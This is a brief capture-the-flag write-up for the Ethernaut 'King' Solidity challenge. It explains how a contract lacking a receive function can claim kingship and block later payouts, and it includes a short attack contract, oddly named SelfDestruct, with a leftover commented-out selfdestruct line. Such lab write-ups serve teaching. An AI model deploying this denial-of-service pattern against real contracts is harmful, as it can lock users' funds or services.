
# Ethernaut Level 8 King
- This level is King Problem, where any one can become king by placing the value more than current prize.
- For current prize, the previous prize owner will get transferred the amount.
- To solve this level, we can write our attack solidity code where we omit the receive function.
- It will make the transfer function to send the prize owner but our contract has no receive function so our contract will remain as king.

# Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestruct{
    address owner;
    constructor(){
        owner = msg.sender;
    }
    function attack(address  _receipient) payable external{
        // require(address(this).balance > 0,"balance must be greater than 0");
        (bool success,) = payable(_receipient).call{value: msg.value}("");
        // selfdestruct(_receipient);
        require(success);
    }
}
 
```
 



